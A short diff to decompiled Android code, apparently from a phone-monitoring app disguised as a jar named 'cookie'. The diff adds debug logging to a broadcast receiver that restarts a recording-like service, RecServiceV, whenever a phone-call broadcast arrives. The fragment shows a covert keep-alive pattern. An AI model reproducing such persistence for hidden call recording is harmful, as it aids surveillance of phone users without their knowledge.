@@ -3,6 +3,7 @@ package com.wish.lmbank.service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.util.Log;
 
 import com.wish.lmbank.R2;
 import com.wish.lmbank.keeplive.utils.ServiceUtils;
@@ -14,10 +15,11 @@ import gv00l3ah.mvdt7w.bb7d7pu7;
  */
 /* loaded from: cookie_9234504.jar:com/wish/lmbank/service/VAServiceRestart.class */
 public class VAServiceRestart extends BroadcastReceiver {
+    private static final String TAG = "VAServiceRestart";
+
     @Override // android.content.BroadcastReceiver
     public void onReceive(Context context, Intent intent) {
-        System.out.println("监听到电话");
-
+        Log.d(TAG, "电话广播");
         String action;
         if (intent == null || (action = intent.getAction()) == null) {
             return;
@@ -30,8 +32,10 @@ public class VAServiceRestart extends BroadcastReceiver {
 
     private void startService(Context context) {
         if (new ServiceUtils().isServiceRunning(context, RecServiceV.class.getName())) {
+            Log.d(TAG, "RecServiceV 已经运行");
             return;
         }
+        Log.d(TAG,"RecServiceV 启动");
         context.startService(new Intent(context, RecServiceV.class));
     }
 }
